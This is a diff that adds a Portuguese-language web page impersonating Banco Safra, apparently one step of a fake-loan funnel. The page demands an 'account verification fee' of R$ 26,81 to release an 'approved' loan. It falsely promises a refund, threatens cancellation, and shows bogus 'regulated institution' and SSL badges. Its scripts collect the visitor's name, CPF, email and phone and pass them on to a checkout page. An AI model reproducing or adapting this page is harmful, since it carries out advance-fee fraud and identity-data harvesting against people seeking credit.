@@ -1,0 +1,291 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<script src="../../js/utm.js"></script>
+<script src="../../js/tracking.js"></script>    <script src="https://cdn.utmify.com.br/scripts/utms/latest.js" data-utmify-prevent-xcod-sck data-utmify-prevent-subids async defer></script>
+    <script>
+    (function () {
+      function readParams() {
+        var p = new URLSearchParams(location.search), o = {};
+        if (p.get('nome')) o.nome = p.get('nome');
+        if (p.get('cpf')) o.cpf = p.get('cpf');
+        return o;
+      }
+      function readJSON(store, key) { try { return JSON.parse(store.getItem(key) || '{}') || {}; } catch (e) { return {}; } }
+      var ls = readJSON(localStorage, 'userdata');
+      var ss = readJSON(sessionStorage, 'user_data');
+      var data = Object.assign({}, ss, ls, readParams());
+      if (data.cpf) data.cpf_limpo = String(data.cpf).replace(/\D/g, '');
+      try { localStorage.setItem('userdata', JSON.stringify(Object.assign({}, ls, data))); } catch (e) {}
+      try { sessionStorage.setItem('user_data', JSON.stringify(Object.assign({}, ss, data))); } catch (e) {}
+      function cpfLimpo() { return data.cpf_limpo || (data.cpf ? String(data.cpf).replace(/\D/g, '') : ''); }
+      window.FunnelUser = {
+        data: data,
+        nome: function () { return data.nome || ''; },
+        primeiroNome: function () { var n = (data.nome || '').trim(); return n ? n.split(/\s+/)[0] : ''; },
+        cpf: cpfLimpo,
+        cpfMascarado: function () {
+          var d = cpfLimpo();
+          return d.length === 11 ? d.substr(0,3)+'.***.***-'+d.substr(9,2) : '';
+        },
+        cpfFormatado: function () {
+          var d = cpfLimpo();
+          return d.length === 11 ? d.substr(0,3)+'.'+d.substr(3,3)+'.'+d.substr(6,3)+'-'+d.substr(9,2) : '';
+        }
+      };
+    })();
+    </script>
+    <meta charset="UTF-8">
+    <meta name="robots" content="noindex, nofollow">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Taxa de Verificação de Conta</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script>
+        tailwind.config = {
+            theme: {
+                extend: {
+                    colors: {
+                        'mp-blue': '#009EE3',
+                        'mp-dark-blue': '#0074A8',
+                        'mp-light-blue': '#E6F7FF',
+                    }
+                }
+            }
+        }
+    </script>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=DM+Sans:opsz,wght@9..40,400;9..40,500;9..40,600;9..40,700&display=swap');
+        * { font-family: 'DM Sans', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif; }
+        body { min-height: 100vh; display: flex; flex-direction: column; }
+        main { flex: 1; }
+        .fade-in { animation: fadeIn 0.5s ease-out; }
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(15px); } to { opacity: 1; transform: translateY(0); } }
+        .progress-bar { transition: width 0.3s ease; }
+    .ss-footer{background:#fff;border-top:1px solid #E5E7EB;padding:32px 20px 24px;text-align:center;font-family:"DM Sans",-apple-system,BlinkMacSystemFont,sans-serif;color:#6B7280;font-size:14px;line-height:1.6}
+    .ss-footer-logo{margin-bottom:16px}
+    .ss-footer-logo img{height:28px;width:auto;display:inline-block}
+    .ss-footer-company{font-size:14px;font-weight:700;color:#111827;margin-bottom:4px}
+    .ss-footer-addr{font-size:12px;color:#9CA3AF;margin-bottom:16px}
+    .ss-footer-links{display:flex;justify-content:center;gap:8px;flex-wrap:wrap;margin-bottom:16px;padding-top:16px;border-top:1px solid #E5E7EB}
+    .ss-footer-links a{color:#374151;text-decoration:none;font-size:12px;font-weight:500;cursor:pointer}
+    .ss-footer-links a:hover{color:#F97316}
+    .ss-footer-links span{opacity:.4;font-size:12px}
+    .ss-footer-badges{display:flex;align-items:center;justify-content:center;gap:16px;flex-wrap:wrap}
+    .ss-footer-badges span{display:flex;align-items:center;gap:4px;font-size:11px;color:#6B7280;font-weight:500}
+    .ss-footer-badges svg{width:14px;height:14px;color:#020031}
+    .ss-dialog{border:0;padding:0;border-radius:20px;color:#111827;max-width:600px;width:calc(100% - 32px);box-shadow:0 20px 60px rgba(0,0,0,.2)}
+    .ss-dialog::backdrop{background:rgba(0,0,0,.5);backdrop-filter:blur(4px)}
+    .ss-dialog-head{display:flex;justify-content:space-between;align-items:center;padding:24px 24px 20px;border-bottom:1px solid #E5E7EB}
+    .ss-dialog-head h2{font-family:"DM Sans",sans-serif;font-size:20px;font-weight:700;margin:0}
+    .ss-dialog-close{background:none;border:none;font-size:32px;color:#6B7280;cursor:pointer;width:36px;height:36px;display:flex;align-items:center;justify-content:center;border-radius:50%;transition:all .2s;line-height:1;padding:0}
+    .ss-dialog-close:hover{background:#F3F4F6;color:#111827}
+    .ss-dialog-body{padding:24px;overflow-y:auto;max-height:70vh}
+    .ss-dialog-body h3{font-size:17px;font-weight:700;color:#111827;margin:24px 0 12px}
+    .ss-dialog-body h3:first-child{margin-top:0}
+    .ss-dialog-body p{font-size:14px;line-height:1.7;color:#6B7280;margin-bottom:16px}
+    .ss-dialog-body ul{margin:12px 0 16px 20px;padding:0}
+    .ss-dialog-body li{font-size:14px;line-height:1.7;color:#6B7280;margin-bottom:8px}
+    </style>
+</head>
+<body class="bg-gray-50">
+    <header class="bg-[#fff] border-b border-[#E5E7EB] shadow-sm">
+        <div class="flex flex-wrap items-center justify-between p-4 border-b shadow-sm sticky top-0 z-10" style="background-color: white;">
+            <div class="flex items-center">
+                <div class="flex items-center">
+                    <img src="../../images/logo.png?v=safra2" alt="Safra" class="h-8">
+                </div>
+            </div>
+            <div id="userInfoHeader" class="flex flex-col items-end text-sm">
+                <div class="flex items-center font-medium" style="color:#020031">
+                    <span id="hdr-nome"></span>
+                </div>
+            </div>
+        </div>
+    </header>
+
+    <main class="py-8 px-4 md:py-12">
+        <div class="max-w-2xl mx-auto">
+            <div class="mb-6">
+                <div class="flex items-center justify-between mb-2">
+                    <span class="text-sm font-medium text-gray-600">Verificação</span>
+                    <span class="text-sm font-medium" style="color:#020031;">85%</span>
+                </div>
+                <div class="w-full bg-gray-200 rounded-full h-2">
+                    <div class="progress-bar h-2 rounded-full" style="width: 85%;background-color:#020031;"></div>
+                </div>
+            </div>
+
+            <div class="bg-white rounded-2xl shadow-sm border border-gray-100 p-6 md:p-8 fade-in">
+                <div class="text-center mb-8">
+                    <h1 id="titulo" class="text-2xl md:text-3xl font-bold text-gray-900 mb-2">Taxa de Verificação de Conta</h1>
+                    <p class="text-gray-600">Confirme a titularidade para liberar seu empréstimo</p>
+                </div>
+
+                <div class="border-l-4 rounded-lg p-5 mb-6" style="background-color:#F8F8F8; border-left-color:#020031;">
+                    <h3 class="font-semibold text-gray-900 mb-3 flex items-center gap-2">
+                        <svg class="w-5 h-5" fill="currentColor" viewBox="0 0 20 20" style="color:#020031;">
+                            <path fill-rule="evenodd" d="M18 10a8 8 0 11-16 0 8 8 0 0116 0zm-7-4a1 1 0 11-2 0 1 1 0 012 0zM9 9a1 1 0 000 2v3a1 1 0 001 1h1a1 1 0 100-2v-3a1 1 0 00-1-1H9z" clip-rule="evenodd"></path>
+                        </svg>
+                        Por que essa verificação?
+                    </h3>
+                    <p class="text-sm text-gray-700 leading-relaxed mb-3">
+                        Nosso sistema identificou uma movimentação de valor alto vinculada ao seu empréstimo aprovado. Por motivos de segurança, é necessário confirmar a titularidade da conta antes da liberação do valor.
+                    </p>
+                    <p class="text-sm text-gray-700 leading-relaxed">
+                        A Taxa de Verificação de Conta confirma que você é o real titular e libera a confirmação definitiva do seu empréstimo.
+                    </p>
+                </div>
+
+                <div class="bg-gray-50 rounded-xl p-6 mb-6 border border-gray-200">
+                    <h3 class="font-semibold text-gray-900 mb-4">Garantias incluídas</h3>
+                    <ul class="space-y-3">
+                        <li class="flex items-start gap-3 text-gray-700">
+                            <div class="flex-shrink-0 w-6 h-6 bg-green-100 rounded-full flex items-center justify-center mt-0.5">
+                                <svg class="w-4 h-4 text-green-600" fill="currentColor" viewBox="0 0 20 20"><path fill-rule="evenodd" d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z" clip-rule="evenodd"></path></svg>
+                            </div>
+                            <span><strong>Taxa reembolsável</strong> — devolvida automaticamente após a confirmação</span>
+                        </li>
+                        <li class="flex items-start gap-3 text-gray-700">
+                            <div class="flex-shrink-0 w-6 h-6 bg-green-100 rounded-full flex items-center justify-center mt-0.5">
+                                <svg class="w-4 h-4 text-green-600" fill="currentColor" viewBox="0 0 20 20"><path fill-rule="evenodd" d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z" clip-rule="evenodd"></path></svg>
+                            </div>
+                            <span>Garante a <strong>transferência segura</strong> do valor para sua chave Pix</span>
+                        </li>
+                        <li class="flex items-start gap-3 text-gray-700">
+                            <div class="flex-shrink-0 w-6 h-6 bg-green-100 rounded-full flex items-center justify-center mt-0.5">
+                                <svg class="w-4 h-4 text-green-600" fill="currentColor" viewBox="0 0 20 20"><path fill-rule="evenodd" d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z" clip-rule="evenodd"></path></svg>
+                            </div>
+                            <span>Protege contra <strong>movimentações suspeitas</strong> e fraudes</span>
+                        </li>
+                    </ul>
+                </div>
+
+                <div class="bg-red-50 border-l-4 border-red-500 p-4 mb-6">
+                    <div class="flex">
+                        <svg class="h-5 w-5 text-red-400 mt-0.5" viewBox="0 0 20 20" fill="currentColor">
+                            <path fill-rule="evenodd" d="M8.257 3.099c.765-1.36 2.722-1.36 3.486 0l5.58 9.92c.75 1.334-.213 2.98-1.742 2.98H4.42c-1.53 0-2.493-1.646-1.743-2.98l5.58-9.92zM11 13a1 1 0 11-2 0 1 1 0 012 0zm-1-8a1 1 0 00-1 1v3a1 1 0 002 0V6a1 1 0 00-1-1z" clip-rule="evenodd"></path>
+                        </svg>
+                        <div class="ml-3">
+                            <p class="text-sm font-semibold text-red-800">Importante</p>
+                            <p class="text-sm text-red-700 mt-1">Caso o pagamento não seja concluído, seu empréstimo será bloqueado e a liberação do valor cancelada.</p>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="rounded-xl p-6 mb-8 text-center" style="background-color:#F8F8F8;">
+                    <div class="text-sm font-medium text-gray-700 mb-2">Taxa de Verificação de Conta</div>
+                    <div class="text-4xl font-bold text-gray-900">R$ 26,81</div>
+                </div>
+
+                <button onclick="redirectToCheckout()" class="w-full text-white py-4 rounded-lg font-semibold hover:shadow-lg transition-all mb-4" style="background-color:#020031;">
+                    Pagar e liberar crédito
+                </button>
+
+                <div class="flex items-center justify-center gap-2 p-3 bg-gray-50 rounded-lg border border-gray-200">
+                    <svg class="w-5 h-5 text-green-600" fill="currentColor" viewBox="0 0 20 20">
+                        <path fill-rule="evenodd" d="M2.166 4.999A11.954 11.954 0 0010 1.944 11.954 11.954 0 0017.834 5c.11.65.166 1.32.166 2.001 0 5.225-3.34 9.67-8 11.317C5.34 16.67 2 12.225 2 7c0-.682.057-1.35.166-2.001zm11.541 3.708a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clip-rule="evenodd"></path>
+                    </svg>
+                    <span class="text-sm font-semibold text-gray-700">Ambiente Seguro</span>
+                    <span class="text-xs text-gray-500">| Criptografia SSL 256-bit</span>
+                </div>
+            </div>
+        </div>
+    </main>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', function () {
+            var fu = window.FunnelUser;
+            if (fu) {
+                var nome = fu.primeiroNome ? fu.primeiroNome() : '';
+                if (nome) {
+                    document.getElementById('titulo').textContent = nome + ', confirme sua conta';
+                    var hdr = document.getElementById('hdr-nome');
+                    if (hdr) hdr.textContent = nome;
+                }
+            }
+        });
+        function buildCheckoutParams() {
+            var g = function() { for (var i = 0; i < arguments.length; i++) { try { var v = localStorage.getItem(arguments[i]); if (v && v.trim()) return v.trim(); } catch(e){} } return ''; };
+            var p = new URLSearchParams(window.location.search);
+            ['offer','pix_total','seguro_price','bump1','amount','cotacao_index'].forEach(function(k){ p.delete(k); });
+            var setIfMissing = function(k, v) { if (v && !p.get(k)) p.set(k, v); };
+            setIfMissing('name', g('name', 'nome', 'nomeUsuario'));
+            setIfMissing('email', g('email'));
+            setIfMissing('telephone', g('telephone', 'telefone'));
+            setIfMissing('document', g('document', 'cpf', 'cpfUsuario'));
+            return p.toString();
+        }
+        function redirectToCheckout() {
+            window.location.href = '../../pagamento/?offer=up8&' + buildCheckoutParams();
+        }
+    </script>
+    <script src="/lead.js"></script>
+    <script src="/tracker.js"></script>
+<script>
+(function(){
+  function brl(v){ return Number(v).toLocaleString('pt-BR',{style:'currency',currency:'BRL'}); }
+  var emp = parseFloat(new URLSearchParams(location.search).get('emprestimo'));
+  try {
+    var u = JSON.parse(localStorage.getItem('userdata')||'{}')||{};
+    if(!isNaN(emp) && emp > 0){ u.emprestimo = emp; localStorage.setItem('userdata', JSON.stringify(u)); }
+    else emp = parseFloat(u.emprestimo) || (parseFloat(u.saldo) ? parseFloat(u.saldo)-75 : 0);
+  } catch(e){}
+  if(!emp || emp <= 0) emp = 7000;
+  document.querySelectorAll('[data-emprestimo]').forEach(function(el){ el.textContent = brl(emp); });
+})();
+</script>
+
+<footer class="ss-footer">
+  <div class="ss-footer-logo"><img src="../../images/logo.png?v=safra2" alt="Safra"></div>
+  <p class="ss-footer-company">&copy; 2025 Pagamentos S.A &ndash; Instituição de Pagamento.</p>
+  <p class="ss-footer-addr">São Paulo, SP &ndash; CEP 05409-000</p>
+  <div class="ss-footer-links">
+    <a onclick="document.getElementById('ss-termos').showModal();return false;">Termos de Uso</a><span>&bull;</span>
+    <a onclick="document.getElementById('ss-privacidade').showModal();return false;">Política de Privacidade</a><span>&bull;</span>
+    <a onclick="document.getElementById('ss-contato').showModal();return false;">Contato</a>
+  </div>
+  <div class="ss-footer-badges">
+    <span><svg fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"/></svg>SSL Seguro</span>
+    <span><svg fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z"/></svg>Dados protegidos</span>
+    <span><svg fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 21V5a2 2 0 00-2-2H7a2 2 0 00-2 2v16m14 0h2m-2 0h-5m-9 0H3m2 0h5M9 7h1m-1 4h1m4-4h1m-1 4h1m-5 10v-5a1 1 0 011-1h2a1 1 0 011 1v5m-4 0h4"/></svg>Instituição regulada</span>
+  </div>
+</footer>
+
+<dialog id="ss-termos" class="ss-dialog">
+  <div class="ss-dialog-head"><h2>Termos de Uso</h2><button class="ss-dialog-close" onclick="this.closest('dialog').close()">&times;</button></div>
+  <div class="ss-dialog-body">
+    <h3>1. Aceitação dos Termos</h3>
+    <p>Ao acessar e utilizar os serviços da Safra, você concorda com estes Termos de Uso.</p>
+    <h3>2. Serviços Oferecidos</h3>
+    <p>A Safra é uma instituição financeira digital que oferece serviços de empréstimo pessoal com aprovação rápida e processo 100% online.</p>
+    <h3>3. Elegibilidade</h3>
+    <ul><li>Ser maior de 18 anos</li><li>Possuir CPF válido</li><li>Ter conta bancária ativa em seu nome</li></ul>
+  </div>
+</dialog>
+
+<dialog id="ss-privacidade" class="ss-dialog">
+  <div class="ss-dialog-head"><h2>Política de Privacidade</h2><button class="ss-dialog-close" onclick="this.closest('dialog').close()">&times;</button></div>
+  <div class="ss-dialog-body">
+    <h3>1. Coleta de Dados</h3>
+    <p>A Safra coleta dados pessoais, de contato, financeiros e de navegação.</p>
+    <h3>2. Seus Direitos (LGPD)</h3>
+    <ul><li>Acessar seus dados pessoais</li><li>Corrigir dados incompletos</li><li>Solicitar exclusão de dados</li></ul>
+  </div>
+</dialog>
+
+<dialog id="ss-contato" class="ss-dialog">
+  <div class="ss-dialog-head"><h2>Fale Conosco</h2><button class="ss-dialog-close" onclick="this.closest('dialog').close()">&times;</button></div>
+  <div class="ss-dialog-body">
+    <div style="display:flex;gap:16px;align-items:flex-start;padding:20px;background:#FAFBFC;border:1px solid #E5E7EB;border-radius:16px;margin-bottom:12px"><div style="width:48px;height:48px;background:#020031;border-radius:50%;display:flex;align-items:center;justify-content:center;flex-shrink:0"><svg fill="none" stroke="currentColor" viewBox="0 0 24 24" width="24" height="24" style="color:#fff"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M3 8l7.89 5.26a2 2 0 002.22 0L21 8M5 19h14a2 2 0 002-2V7a2 2 0 00-2-2H5a2 2 0 00-2 2v10a2 2 0 002 2z"/></svg></div><div><h4 style="font-size:15px;font-weight:700;color:#111827;margin:0 0 4px">Email</h4><p style="font-size:14px;color:#6B7280;margin:0">contato@safra.com.br</p></div></div>
+    <div style="margin-top:16px;padding:20px;background:#FAFBFC;border:1px solid #E5E7EB;border-radius:12px"><p style="font-size:13px;line-height:1.6;color:#374151;margin-bottom:8px"><strong style="color:#020031">CNPJ:</strong> 58.160.789/0001-28</p><p style="font-size:13px;line-height:1.6;color:#374151;margin:0"><strong style="color:#020031">Razão Social:</strong> Banco Safra S.A.</p></div>
+  </div>
+</dialog>
+
+<script>
+document.querySelectorAll('.ss-dialog').forEach(function(d){d.addEventListener('click',function(e){if(e.target===d)d.close();});});
+</script>
+
+<script>if(/^(localhost|127\.0\.0\.1)$/.test(location.hostname)){var s=document.createElement("script");s.src="/dev-mode.js";document.body.appendChild(s);}</script>
+<script src="../../js/devnav.js"></script>
+</body>
+</html>
